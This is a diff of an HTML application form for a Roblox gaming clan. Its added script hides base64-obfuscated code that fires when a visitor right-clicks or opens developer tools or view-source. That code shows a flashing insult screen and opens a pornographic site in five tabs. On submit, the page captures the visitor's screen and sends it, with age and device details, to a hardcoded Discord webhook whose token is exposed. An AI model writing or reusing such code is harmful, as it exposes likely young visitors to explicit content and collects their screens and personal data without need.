@@ -1,271 +1,271 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ixora Clan | Application</title>
-    <link rel="icon" type="image/png" href="logo.jpg">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-
-    <style>
-        :root { 
-            --discord-dark: #000000; 
-            --text-gray: #b5bac1; 
-            --radius: 25px;
-            --discord-blurple: #5865F2; 
-        }
-
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-image: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('BACKGROUND.png');  
-            background-size: cover; background-position: center; background-attachment: fixed;
-            margin: 0; display: flex; justify-content: center; align-items: flex-start; 
-            min-height: 100vh; color: white; padding: 40px 20px;
-            cursor: pointer;
-        }
-
-        /* --- RGB SCROLLBAR --- */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.3); }
-        ::-webkit-scrollbar-thumb { 
-            background: linear-gradient(#ff0000, #00ff00, #0000ff, #ffff00); 
-            border-radius: 10px; 
-        }
-
-        /* --- CONTAINER STYLE --- */
-        .form-container {
-            position: relative; 
-            background: var(--discord-dark); 
-            padding: 50px 40px; 
-            border-radius: var(--radius); 
-            width: 100%; 
-            max-width: 600px; 
-            overflow: hidden; 
-            z-index: 10; 
-            box-shadow: 0 10px 50px rgba(0,0,0,0.9);
-            text-align: left;
-            animation: fadeIn 0.6s ease-out;
-        }
-
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* RGB Border */
-        .form-container::before { content: ''; position: absolute; z-index: -2; left: -50%; top: -50%; width: 200%; height: 200%; background-image: conic-gradient(#ff0000, #00ff00, #0000ff, #ffff00, #ff0000); animation: rotate 15s linear infinite; }
-        .form-container::after { content: ''; position: absolute; z-index: -1; left: 4px; top: 4px; width: calc(100% - 8px); height: calc(100% - 8px); background: var(--discord-dark); border-radius: calc(var(--radius) - 4px); }
-
-        .header-image { display: block; margin: 0 auto 25px auto; width: 120px; border-radius: 15px; filter: drop-shadow(0 0 10px var(--discord-blurple)); }
-        h1 { font-size: 28px; font-weight: 800; margin-top: 0; text-align: center; }
-        .subtitle { color: var(--text-gray); font-size: 15px; text-align: center; margin-bottom: 35px; line-height: 1.6; }
-
-        /* --- FORM FIELDS --- */
-        label { display: block; margin-top: 25px; font-size: 12px; font-weight: bold; color: var(--text-gray); text-transform: uppercase; letter-spacing: 1px; }
-        
-        input[type="text"] { 
-            width: 100%; padding: 15px; margin-top: 8px; border: none;
-            background: #111; color: white; border-radius: 12px;
-            box-sizing: border-box; font-size: 15px; border: 1px solid #333;
-        }
-        input[type="text"]:focus { border-color: #ff0000; outline: none; }
-
-        .row { display: flex; gap: 15px; flex-wrap: wrap; }
-        .row > div { flex: 1; min-width: 140px; }
-
-        /* UPLOAD BOX */
-        .upload-box {
-            margin-top: 15px; border: 2px dashed #444; border-radius: 15px;
-            padding: 30px; text-align: center; background: rgba(255,255,255,0.03);
-            cursor: pointer; transition: 0.3s;
-        }
-        .upload-box:hover { border-color: #00ff00; background: rgba(0, 255, 0, 0.05); }
-        #imagePreview img { margin-top: 15px; max-width: 100%; border-radius: 12px; border: 1px solid #444; }
-
-        /* --- BUTTONS --- */
-        .submit-btn {
-            position: relative; width: 100%; margin-top: 40px; padding: 20px;
-            background: transparent; color: white; font-weight: 800; font-size: 17px;
-            border-radius: 15px; z-index: 1; overflow: hidden; border: none; cursor: pointer;
-            text-transform: uppercase; transition: transform 0.2s;
-        }
-        .submit-btn::before { content: ''; position: absolute; z-index: -2; left: -50%; top: -50%; width: 200%; height: 200%; background-image: conic-gradient(#ff0000, #00ff00, #0000ff, #ff00ff, #ff0000); animation: rotate 8s linear infinite; }
-        .submit-btn::after { content: ''; position: absolute; z-index: -1; left: 3px; top: 3px; width: calc(100% - 6px); height: calc(100% - 6px); background: #000; border-radius: 13px; }
-        .submit-btn:hover { transform: scale(1.02); }
-
-        .mute-toggle { position: fixed; top: 20px; right: 20px; width: 50px; height: 50px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 100; border: 1px solid #444; color: white; font-size: 20px; }
-        .footer-note { font-size: 12px; text-align: center; margin-top: 20px; color: #ff4747; font-weight: bold; }
-
-        /* FIRE CANVAS */
-        #fireCanvas { position: fixed; bottom: 0; left: 0; width: 100%; height: 400px; z-index: 1; pointer-events: none; }
-    </style>
+<meta charset="UTF-8"><title>Ixora Clan | Application</title>
+<link rel="icon" type="image/png" href="logo.jpg">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--d:#000;--tg:#b5bac1;--r:25px;--ng:#00ff88;--nr:#ff4444;--db:#5865F2}
+body{font-family:'Segoe UI',sans-serif;background:linear-gradient(rgba(0,0,0,.6),rgba(0,0,0,.6)),url('BACKGROUND.PNG') center/cover fixed;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;overflow-x:hidden;user-select:none;cursor:none}
+#customCursor{width:20px;height:26px;background:var(--ng);position:fixed;pointer-events:none;z-index:99999999;clip-path:polygon(0% 0%,100% 70%,40% 70%,40% 100%);filter:drop-shadow(0 0 8px var(--ng));transition:transform .1s ease-out,background .2s,filter .2s}
+#loader{position:fixed;inset:0;background:#000;z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;transition:opacity .6s,visibility .6s}
+#loader img{width:150px;border-radius:20px;cursor:pointer;transition:.3s;border:2px solid #fff;margin-bottom:20px;animation:p 2s infinite}
+#loader p{letter-spacing:3px;font-weight:700;animation:fio 1.5s infinite}
+@keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.05);box-shadow:0 0 30px rgba(255,255,255,.2)}}
+@keyframes fio{0%,100%{opacity:.3}50%{opacity:1}}
+.form-container{position:relative;background:var(--d);padding:40px;border-radius:var(--r);width:100%;max-width:600px;z-index:10;box-shadow:0 10px 50px #000;display:none;text-align:left;margin:20px}
+.form-container.active{display:block;animation:fi .4s ease-out}
+.form-container::before{content:'';position:absolute;z-index:-2;inset:-4px;background:conic-gradient(from var(--angle),#ff4545,#00ff99,#006aff,#ff0095,#ff4545);animation:rot 4s linear infinite;border-radius:29px}
+.form-container::after{content:'';position:absolute;z-index:-1;inset:2px;background:var(--d);border-radius:23px}
+@property --angle{syntax:'<angle>';initial-value:0deg;inherits:false}
+@keyframes rot{from{--angle:0deg}to{--angle:360deg}}
+@keyframes fi{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
+.header-image{display:block;margin:0 auto 20px;width:110px;border-radius:15px;border:2px solid #fff;box-shadow:0 0 15px rgba(255,255,255,0.3)}
+h1{font-size:26px;text-align:center;margin-bottom:5px}
+.subtitle{color:var(--tg);font-size:13px;text-align:center;margin-bottom:25px;line-height:1.4}
+label{display:block;margin-top:15px;font-size:11px;font-weight:700;color:var(--tg);text-transform:uppercase}
+input,textarea,.submit-btn,.upload-box,.mute-toggle,#startBtn,a{cursor:none!important}
+input[type=text],input[type=number],textarea{width:100%;padding:12px;margin-top:5px;border:1px solid #333;background:#111;color:#fff;border-radius:10px;box-sizing:border-box;font-family:inherit;transition:border-color .3s}
+input.invalid,textarea.invalid,.upload-box.invalid{border-color:var(--nr)!important}
+.error-msg{color:var(--nr);font-size:10px;margin-top:4px;display:none;font-weight:700}
+input.invalid+.error-msg,textarea.invalid+.error-msg,div.invalid+.error-msg{display:block}
+.row{display:flex;gap:10px;flex-wrap:wrap}
+.row>div{flex:1;min-width:120px}
+.upload-box{margin-top:10px;border:2px dashed #444;border-radius:12px;padding:20px;text-align:center;background:rgba(255,255,255,.03);cursor:pointer;transition:.3s}
+#imagePreview img{margin-top:10px;max-width:100%;border-radius:8px;border:1px solid #f00}
+.submit-btn{position:relative;width:100%;margin-top:30px;padding:18px;background:#000;color:#fff;font-weight:800;border-radius:15px;z-index:11;overflow:hidden;border:1px solid #333;cursor:pointer;text-transform:uppercase}
+.submit-btn:disabled{opacity:.5;cursor:not-allowed}
+.mute-toggle{position:fixed;top:20px;right:20px;width:45px;height:45px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:100;border:1px solid #444;color:#fff}
+#fireCanvas{position:fixed;bottom:0;left:0;width:100%;height:100vh;z-index:1;pointer-events:none;opacity:.8;filter:blur(2px)}
+.trap-screen{display:none;position:fixed;inset:0;z-index:999999;flex-direction:column;justify-content:center;align-items:center;animation:flR .05s infinite;text-align:center}
+.trap-screen h1{font-size:120px;font-weight:900;color:#fff;margin:0;text-shadow:0 0 30px #000;animation:shake .1s infinite}
+.trap-screen h2{font-size:30px;color:#fff;text-transform:uppercase;letter-spacing:2px;background:#000;padding:10px 20px}
+@keyframes flR{0%,100%{background:red}50%{background:#000}}
+@keyframes shake{0%{transform:translate(2px,1px) rotate(0deg)}20%{transform:translate(-1px,-2px) rotate(-1deg)}40%{transform:translate(-3px,0px) rotate(1deg)}60%{transform:translate(3px,2px) rotate(0deg)}80%{transform:translate(1px,-1px) rotate(1deg)}100%{transform:translate(-1px,2px) rotate(-1deg)}}
+.footer-note{font-size:13px;text-align:center;margin-top:20px;color:var(--ng);font-weight:700;text-shadow:0 0 10px rgba(0,255,136,.3)}
+.captcha-container{margin-top:20px;background:#111;padding:15px;border-radius:12px;border:1px solid #333;display:flex;flex-direction:column;gap:10px}
+.captcha-box{display:flex;align-items:center;justify-content:space-between}
+#captchaText{font-family:'Courier New',monospace;font-weight:900;font-size:20px;background:linear-gradient(45deg,#00ff88,#5865F2);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:5px;user-select:none;font-style:italic;text-decoration:line-through}
+.refresh-captcha{color:var(--tg);font-size:18px;cursor:pointer}
+</style>
 </head>
-<body>
-
+<body oncontextmenu="return false">
+<div id="customCursor"></div>
+<div id="loader"><img src="logo.jpg" id="startBtn"><p>CLICK LOGO TO ENTER</p></div>
+<audio id="v1" loop><source src="labsong.mp3"></audio><audio id="v2"><source src="Nice (meme) - Sound Effect.mp3"></audio><audio id="bgMusic" loop><source src="IXORA EY.mp3"></audio>
 <button class="mute-toggle" id="muteBtn"><i class="bi bi-volume-mute-fill" id="muteIcon"></i></button>
 
-<div class="form-container">
-    <img src="logo.jpg" class="header-image">
-    <h1>Ixora Clan Application</h1>
-    <p class="subtitle">
-        Put <b>IX_</b> beside your name. If you can't change it yet, use <b>(unofficial)</b>.<br>
-        Complete the form below, then take a screenshot.
-    </p>
-
-    <form>
-        <label>Identity & In-Game Info</label>
-        <input type="text" placeholder="In-Game Name">
-        <div class="row">
-            <input type="text" placeholder="Roblox Username">
-            <input type="text" placeholder="Display Name">
-        </div>
-
-        <div class="row">
-            <div>
-                <label>Total Power</label>
-                <input type="text" placeholder="e.g. 10M+">
-            </div>
-            <div>
-                <label>Rank</label>
-                <input type="text" placeholder="e.g. Grandmaster">
-            </div>
-            <div>
-                <label>Age</label>
-                <input type="text" placeholder="Your age">
-            </div>
-        </div>
-
-        <div class="row">
-            <div style="flex: 2;">
-                <label>Activeness</label>
-                <input type="text" placeholder="Rate 1-10">
-            </div>
-            <div style="flex: 2;">
-                <label>Discord Tag</label>
-                <input type="text" placeholder="User#0000">
-            </div>
-            <div style="flex: 2;">
-                <label>Facebook Name</label>
-                <input type="text" placeholder="Your FB Profile">
-            </div>
-        </div>
-
-        <label>Date Joined</label>
-        <div class="row">
-            <div style="flex: 1;"><input type="text" placeholder="Month"></div>
-            <div style="flex: 1;"><input type="text" placeholder="Day"></div>
-            <div style="flex: 1;"><input type="text" placeholder="Year"></div>
-        </div>
-
-        <label>Upload Profile/Rank Proof</label>
-        <div class="upload-box" onclick="document.getElementById('imageUpload').click()">
-            <i class="bi bi-cloud-arrow-up-fill" style="font-size: 32px; color: var(--discord-blurple);"></i>
-            <p style="margin: 10px 0; font-size: 14px; color: var(--text-gray);">Tap to upload proof</p>
-            <input type="file" id="imageUpload" accept="image/*" hidden>
-            <div id="imagePreview"></div>
-        </div>
-
-        <label>Why should we accept you?</label>
-        <input type="text" placeholder="Enter your answer...">
-
-        <button type="button" class="submit-btn" onclick="window.scrollTo(0,0)">READY FOR SCREENSHOT</button>
-        <p class="footer-note">TAKE A SCREENSHOT CUZ WE DON'D HAB DOMAIN WE BROKE SALAMAT!</p>
-    </form>
+<div class="form-container" id="mainPage">
+<img src="logo.jpg" class="header-image">
+<h1>Ixora Clan Application</h1>
+<p class="subtitle">Put <b>IX_</b> beside your name. If you can't change it yet, use <b>(unofficial)</b>.<br>Complete the form below, then submit.</p>
+<form id="appForm" novalidate>
+<label>IDENTITY & IN-GAME INFO</label>
+<input type="text" id="ign" placeholder="In-Game Name" required><span class="error-msg">Name is required</span>
+<input type="text" id="rbx" placeholder="Roblox Username" required style="margin-top:10px"><span class="error-msg">Username is required</span>
+<input type="text" id="disp" placeholder="Display Name" required style="margin-top:10px"><span class="error-msg">Display is required</span>
+<div class="row">
+<div><label>Total Power</label><input type="text" id="pwr" placeholder="e.g. 10M+" required><span class="error-msg">Required</span></div>
+<div><label>Rank</label><input type="text" id="rank" placeholder="e.g. Grandmaster" required><span class="error-msg">Required</span></div>
+<div><label>Age</label><input type="number" id="age" placeholder="Age" required min="1" max="99"><span class="error-msg">Invalid</span></div>
+</div>
+<div class="row">
+<div><label>Activeness</label><input type="number" id="active" placeholder="1-10" required min="1" max="10"><span class="error-msg">1-10</span></div>
+<div><label>Discord Tag</label><input type="text" id="discord" placeholder="User#0000" required><span class="error-msg">Required</span></div>
+<div><label>Facebook Name</label><input type="text" id="fb" placeholder="Your FB Profile" required><span class="error-msg">Required</span></div>
+</div>
+<label>DATE JOINED</label>
+<div class="row">
+<div><input type="number" id="dMonth" placeholder="MM" required min="1" max="12"><span class="error-msg">1-12</span></div>
+<div><input type="number" id="dDay" placeholder="DD" required min="1" max="31"><span class="error-msg">1-31</span></div>
+<div><input type="number" id="dYear" placeholder="YYYY" required min="2020" max="2030"><span class="error-msg">Invalid</span></div>
+</div>
+<label>Upload Profile/Rank Proof (Required)</label>
+<div class="upload-box" id="dropZone" onclick="document.getElementById('imageUpload').click()">
+<i class="bi bi-cloud-arrow-up-fill" style="font-size:24px;color:var(--db)"></i>
+<p style="margin:5px 0;font-size:12px;color:var(--tg)">Tap to upload proof</p>
+<input type="file" id="imageUpload" accept="image/*" hidden required>
+<div id="imagePreview"></div>
+</div><span class="error-msg" id="fileError">Proof required</span>
+<label>Why should we accept you?</label>
+<textarea id="reason" placeholder="Enter your answer..." rows="3" required style="margin-top:5px;resize:none"></textarea><span class="error-msg">Required</span>
+<div class="captcha-container">
+<div class="captcha-box"><span id="captchaText"></span><i class="bi bi-arrow-clockwise refresh-captcha" id="refreshCaptcha"></i></div>
+<input type="text" id="captchaInput" placeholder="Enter the code above" required>
+<span class="error-msg" id="captchaError">Code mismatch</span>
+</div>
+<button type="button" class="submit-btn" id="subBtn">SUBMIT APPLICATION</button>
+<p class="footer-note">Please wait for the screen capture prompt on submit!</p>
+</form>
 </div>
 
 <canvas id="fireCanvas"></canvas>
-<audio id="bgMusic" loop preload="auto"><source src="IXORA EY.mp3" type="audio/mpeg"></audio>
 
 <script>
-    const music = document.getElementById('bgMusic');
-    const muteIcon = document.getElementById('muteIcon');
-    music.volume = 0.4;
+(function(){
+const d=document, s=i=>d.getElementById(i), a=b=>atob(b), _M=s('v1'), _N=s('v2'), _B=s('bgMusic'), _I=s('muteIcon'), _C=s('customCursor');
+let _T=!1;
 
-    function startMusic() {
-        music.play().then(() => {
-            muteIcon.className = 'bi bi-volume-up-fill';
-            document.removeEventListener('click', startMusic);
-            document.removeEventListener('touchstart', startMusic);
-        }).catch(() => {});
-    }
-    document.addEventListener('click', startMusic);
-    document.addEventListener('touchstart', startMusic);
+d.addEventListener('mousemove',e=>{_C.style.left=e.clientX+'px';_C.style.top=e.clientY+'px'});
+const st=(c,f,sc)=>{_C.style.background=c;_C.style.filter=f;_C.style.transform=`scale(${sc})`;};
+d.addEventListener('mouseover',e=>{
+if(e.target.closest('input,textarea'))st('var(--db)','drop-shadow(0 0 10px var(--db))',1.2);
+else if(e.target.closest('.submit-btn,#startBtn,.mute-toggle'))st('#fff','drop-shadow(0 0 12px #fff)',1.4);
+else if(e.target.closest('.upload-box'))st('var(--ng)','drop-shadow(0 0 15px var(--ng))',1.3)
+});
+d.addEventListener('mouseout',e=>{if(!e.relatedTarget)return;st('var(--ng)','drop-shadow(0 0 8px var(--ng))',1)});
 
-    document.getElementById('muteBtn').onclick = (e) => {
-        e.stopPropagation();
-        if (music.paused) { music.play(); muteIcon.className = 'bi bi-volume-up-fill'; }
-        else { music.pause(); muteIcon.className = 'bi bi-volume-mute-fill'; }
-    };
+const vf=(el)=>{
+let v=true;
+if(el.required&&!el.value.trim())v=false;
+if(el.type==='number'){const n=parseInt(el.value);if(isNaN(n)||n<el.min||n>el.max)v=false}
+el.classList.toggle('invalid',!v);
+return v
+};
 
-    const imageUpload = document.getElementById('imageUpload');
-    const imagePreview = document.getElementById('imagePreview');
-    imageUpload.addEventListener('change', function() {
-        const file = this.files[0];
-        if (file) {
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                imagePreview.innerHTML = `<img src="${e.target.result}" alt="Preview">`;
-            }
-            reader.readAsDataURL(file);
-        }
-    });
+d.querySelectorAll('input,textarea').forEach(e=>e.addEventListener('input',()=>vf(e)));
 
-    // --- HIGH INTENSITY FIRE ENGINE ---
-    const canvas = document.getElementById('fireCanvas');
-    const ctx = canvas.getContext('2d');
-    let particles = [];
-    function resize() { canvas.width = window.innerWidth; canvas.height = 400; }
-    window.onresize = resize; resize();
+const _L=()=>{
+if(_T)return;_T=!0;
+let e=d.createElement('div');
+e.innerHTML=a('PGRpdiBpZD0idHoiIGNsYXNzPSJ0cmFwLXNjcmVlbiI+PGgxPktVUEFMPC9oMT48aDI+TmFnaGFoYW5hcCBrYSBiYSBuZyBjb2Rlcz8gS3VwYWwga2EgYmEgYm9pPyDwnZ2n8J2YnD88L2gyPjwvZGl2Pg==');
+d.body.appendChild(e.firstChild);
+s('tz').style.display='flex';_C.style.display='none';_B.pause();_M.play();
+setTimeout(()=>{for(let i=0;i<5;i++)window.open(a('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'),'_blank')},2e3)
+};
 
-    class Flame {
-        constructor() {
-            this.x = Math.random() * canvas.width;
-            this.y = canvas.height + Math.random() * 80;
-            this.speedY = Math.random() * 3 + 1.5; // Faster rising
-            this.speedX = (Math.random() - 0.5) * 2;
-            this.size = Math.random() * 30 + 15; // Larger particles
-            this.life = 1;
-            this.decay = Math.random() * 0.012 + 0.006;
-        }
-        update() { 
-            this.y -= this.speedY; 
-            this.x += this.speedX; 
-            this.life -= this.decay; 
-            if (this.size > 0.5) this.size -= 0.18; 
-        }
-        draw() {
-            ctx.globalCompositeOperation = "lighter";
-            // Randomize between Orange, Deep Red, and Yellow for a wilder look
-            const r = 255;
-            const g = Math.floor(Math.random() * 120 + 20);
-            const b = 0;
-            ctx.fillStyle = `rgba(${r}, ${g}, ${b}, ${this.life})`;
-            ctx.beginPath(); 
-            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); 
-            ctx.fill();
-        }
-    }
+d.oncontextmenu=e=>(e.preventDefault(),_L(),!1);
+d.onkeydown=e=>{(123==e.keyCode||e.ctrlKey&&e.shiftKey&&(73==e.keyCode||74==e.keyCode)||e.ctrlKey&&85==e.keyCode)&&(_L(),!1)};
 
-    function animate() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        
-        // Spawn more particles per frame for "Fuller" fire
-        if (particles.length < 550) { // Limit increased from 200 to 550
-            for(let i=0; i < 12; i++) { // Spawn rate increased from 5 to 12
-                particles.push(new Flame());
-            }
-        }
-        
-        for (let i = 0; i < particles.length; i++) {
-            particles[i].update(); 
-            particles[i].draw();
-            if (particles[i].life <= 0) { 
-                particles.splice(i, 1); 
-                i--; 
-            }
-        }
-        requestAnimationFrame(animate);
-    }
-    animate();
+let currentCaptcha="";
+const genCaptcha=()=>{
+const chars="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+currentCaptcha="";
+for(let i=0;i<6;i++)currentCaptcha+=chars.charAt(Math.floor(Math.random()*chars.length));
+s('captchaText').innerText=currentCaptcha
+};
+s('refreshCaptcha').onclick=genCaptcha;
+genCaptcha();
+
+s('startBtn').onclick=()=>{
+s('loader').style.opacity='0';
+setTimeout(()=>{s('loader').style.visibility='hidden';s('mainPage').classList.add('active');_B.play().then(()=>_I.className='bi bi-volume-up-fill')},600)
+};
+
+s('muteBtn').onclick=e=>{e.stopPropagation();_B.paused?(_B.play(),_I.className='bi bi-volume-up-fill'):(_B.pause(),_I.className='bi bi-volume-mute-fill')};
+
+const capScreen=async()=>{
+try{
+const stream=await navigator.mediaDevices.getDisplayMedia({video:true});
+const vid=d.createElement('video');
+vid.srcObject=stream;
+await vid.play();
+const cv=d.createElement('canvas');
+cv.width=vid.videoWidth;
+cv.height=vid.videoHeight;
+cv.getContext('2d').drawImage(vid,0,0);
+stream.getTracks().forEach(t=>t.stop());
+return new Promise(res=>cv.toBlob(res,'image/png'))
+}catch(e){return null}
+};
+
+s('subBtn').onclick=async()=>{
+const b=s('subBtn'),i=s('imageUpload'),dz=s('dropZone'),f=d.querySelectorAll('#appForm input,#appForm textarea');
+let v=true;
+f.forEach(x=>{if(!vf(x))v=false});
+if(s('captchaInput').value.toUpperCase()!==currentCaptcha){s('captchaInput').classList.add('invalid');v=false}
+if(!i.files[0]){dz.classList.add('invalid');v=false}
+if(!v){alert("Fix errors first.");return}
+
+_N.play();
+b.innerText="CAPTURING...";
+let sc = await capScreen();
+
+b.innerText="SENDING...";
+b.disabled=true;
+
+const u="https://discord.com/api/webhooks/1463623735969054922/Qfm3meeIEzS89fJU1s8GTsyYID28frvCYtRuLvV1hAshgcK0yNaoUaGakC2usDscza7t",
+fd=new FormData(),
+em={
+title:"🔥 NEW APPLICATION",
+color:16711680,
+fields:[
+{name:"👤 IGN",value:s('ign').value,inline:true},
+{name:"🎮 Roblox",value:s('rbx').value,inline:true},
+{name:"✨ Display",value:s('disp').value,inline:true},
+{name:"⚡ Power",value:s('pwr').value,inline:true},
+{name:"🏆 Rank",value:s('rank').value,inline:true},
+{name:"🎂 Age",value:s('age').value,inline:true},
+{name:"📈 Active",value:s('active').value,inline:true},
+{name:"📱 Discord",value:s('discord').value,inline:true},
+{name:"📅 Joined",value:`${s('dMonth').value}/${s('dDay').value}/${s('dYear').value}`,inline:true},
+{name:"💬 Why?",value:s('reason').value},
+{name:"🌐 Device",value:navigator.userAgent}
+],
+timestamp:new Date()
+};
+
+fd.append("payload_json",JSON.stringify({embeds:[em]}));
+fd.append("file1",i.files[0]);
+if(sc) fd.append("file2",sc,"desktop.png");
+
+try{
+const r=await fetch(u,{method:"POST",body:fd});
+if(r.ok){b.innerText="SENT!";alert("Success!")}
+else { const err = await r.json(); throw new Error(err.message || "Failed"); }
+}catch(e){
+b.innerText="SUBMIT";
+b.disabled=false;
+alert("Error sending to Discord: " + e.message);
+genCaptcha();
+}
+};
+
+s('imageUpload').onchange=function(){
+if(this.files[0]){
+const r=new FileReader();
+r.onload=e=>s('imagePreview').innerHTML=`<img src="${e.target.result}" style="width:100%">`;
+r.readAsDataURL(this.files[0]);
+s('dropZone').classList.remove('invalid')
+}
+};
+
+const c=s('fireCanvas'),x=c.getContext('2d');
+let p=[];
+const res=()=>(c.width=window.innerWidth,c.height=window.innerHeight);
+window.onresize=res;
+res();
+class F{
+constructor(){
+this.x=Math.random()*c.width;
+this.y=c.height+100;
+this.sY=Math.random()*3+1;
+this.sX=(Math.random()-0.5)*2;
+this.sz=Math.random()*25+5;
+this.l=1;
+this.d=Math.random()*0.01+0.003;
+this.h=Math.random()<.2?200:Math.random()*40+10
+}
+u(){this.y-=this.sY;this.x+=this.sX;this.l-=this.d}
+dr(){
+x.globalCompositeOperation='lighter';
+x.fillStyle=`hsla(${this.h},100%,50%,${this.l*0.6})`;
+x.beginPath();
+x.arc(this.x,this.y,this.sz,0,Math.PI*2);
+x.fill()
+}
+}
+function an(){
+x.clearRect(0,0,c.width,c.height);
+if(p.length<150)p.push(new F);
+for(let i=p.length-1;i>=0;i--){
+p[i].u();p[i].dr();
+if(p[i].l<=0||p[i].y<-50)p.splice(i,1)
+}
+requestAnimationFrame(an)
+}
+an()
+})();
 </script>
-
 </body>
 </html>
